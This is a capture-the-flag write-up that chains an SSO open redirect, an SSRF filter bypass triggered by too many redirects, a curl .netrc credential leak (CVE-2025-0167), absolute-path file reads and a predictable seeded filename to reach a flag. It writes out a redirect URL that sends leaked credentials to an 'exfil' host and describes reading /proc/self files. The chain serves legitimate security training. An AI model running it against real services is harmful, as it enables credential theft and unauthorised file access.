#### Single Sign Off
- points earned: 50

#### Notes
- The flag is loaded into the app via an environment variable and stored in `/app/nite-vault/secrets/` with a random name.
- There is a weakness in the way that `nite-vault` creates the name of the flag file.
	```python
	def generate_filename():
		pid = os.getpid()
		uid = os.getuid()
		gid = os.getgid()
		seed = int(f"{pid}{uid}{gid}")
		random.seed(seed)
		random_num = random.randint(100000, 999999)
		hash_part = hashlib.sha256(str(random_num).encode()).hexdigest()[:16]
		return f"{hash_part}.txt"
	```
	- The `seed` is created from `pid`, `uid`, and `gid` which means that if we can get those values, then we can determine the flag filename.
- There is a weakness in the way `nite-vault` validates the filename to be opened
	```python
	if '../' in filename or '..\\'in filename:
		return 'Path traversal detected', 403
	try:
		if not filename.startswith('/'):
			file_path = os.path.join(PUBLIC_DIR, filename)
		else:
			file_path = filename
	```
	- it prevents against path traversal by checking for `../` in the filename
	- However, it seems to insist that an absolute path is OK
		- I say 'insist' because it specifically checks for a `/` at the beginning and uses `PUBLIC_DIR` if it does not exist but allows it if it does exist.
		- This is kind of funny because the block of code is irrelevant.  There is a common footgun in `os.path.join` where if the second argument is an absolute path then the first argument is disregarded.
			```python
 			>>> os.path.join('bark', '/meow')
			'/meow'
			```
	- so, there is an arbitrary file read here, if access can be gained to `nite-vault`
- The `nite-vault` nginx block prevents access if its not from `127.0.0.1`
```http
server {
	listen 80;
	server_name nite-vault.nite.com nite-vault;
	allow 127.0.0.1;
	deny all;
```
- The `nite-sso` app has an open redirect in `/doLogin?redirect=`
	- This is common in SSO services and its just the way it is
- There is an issue in the way the `document-portal` `fetcher` validates urls.  Specifically when there are multiple redirects.
	- on most occasions, it does a pretty good job of preventing requests that go to `localhost`
	- However, it is configured to allow a max of 5 redirects and once the max is hit, the `case CURLE_TOO_MANY_REDIRECTS` block is executed.  This block gets information about the last redirect and the sends one more request to that location WITHOUT validating the url.
	- So, if it happens to be localhost then it is allowed.
	```c
	case CURLE_TOO_MANY_REDIRECTS:
		fprintf(stderr, "Redirect Error: Too many redirects encountered\n");
		  
		char *redirect_url = NULL;
		curl_easy_getinfo(curl, CURLINFO_REDIRECT_URL, &redirect_url);
		if(redirect_url && strlen(redirect_url) > 0) {
		  
			free(chunk->memory);
			chunk->memory = malloc(1);
			chunk->size = 0;
			curl_easy_setopt(curl, CURLOPT_URL, redirect_url);
			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);
			curl_easy_setopt(curl, CURLOPT_PREREQFUNCTION, NULL);
			CURLcode res2 = curl_easy_perform(curl);
			if(res2 == CURLE_OK && chunk->size > 0) {
				return 0;
			}
		}
		return 1;
	```
- In the `Dockerfile` there is a block of code that creates a `/root/.netrc` file with some creds.  One set of creds is configured for the `nite-sso` server.
	- The purpose of this file is to allow tools, like curl, to use the creds to authenticate to certain services.
	- This file happens to be used in `document-portal` `fetcher` application
		```c
		curl_easy_setopt(curl, CURLOPT_NETRC_FILE, "/root/.netrc");
		```
	- The idea is that if curl sends a request to a server and that server returns a `401 Unathorized` and a `WWW-Authenticate: Basic` header then curl will resend the request using the creds from the `.netrc` in the `Authorization: Basic` header.
- The creds used in the `.netrc` file are the same ones configured to allow authentication to the `nite-vault` app `/view` route.
- This version of curl is vulnerable to CVE-2025-0167
	- I google searched for `curl vulns` which led me to https://curl.se/docs/security.html
	- Close to the top of the list there were 2 `.netrc` realted reports but CVE-2025-0167 seemed to fit the case of this challenge perfectly
	- The basic idea is that if there is a rule for `nite-sso` and `nite-sso` redirects to `http://exfil` then curl will send the credentials along to the exfil server as long as the exfil server replies with the `401` and headers described above.
	- It's worth noting that I was not able to recreate this issue on my local docker container, however, it DID work against the live target.
- There's a lost of moving pieces here, I hope I got them all.
#### Solution
- register a new account and log in
	- In my case I used username `aaa` and password `aaaaaa`
- Click the `Access Document Portal` link to get the `document-portal` app
- Leak the creds from `.netrc`
	- Configure exfil server to reply with a `401 Unathorized` and `WWW-Authenticate: Basic` header
	- Send a link similar to `http://nite-sso/doLogin?username=aaa&password=aaaaaa&redirect_url=http://exfil` to the `document-portal` `fetcher`
	- the `.netrc` creds will be sent to the exfil server
- At this point you can construct a url for `nite-sso` such that it redirects to itself 5 times before finally redirecting to the `nite-vault` server to acheive an arbitrary file read.  I provided the python code for this process in this repo.
- Use the arbitrary file read to leak the `pid`, `uid` and `gid` from `/proc/self`
	- `/proc/self/status`
	- `/proc/self/uid_map`
	- `/proc/self/gid_map`
- Use the `pid`, `uid` and `gid` to determine the flag file name.
	- I have also included code to do that in this repo, however, I basically just copy/pasted from the challenge source code.
- Knowing the flag filename, use the arbitrary file read to read the flag file.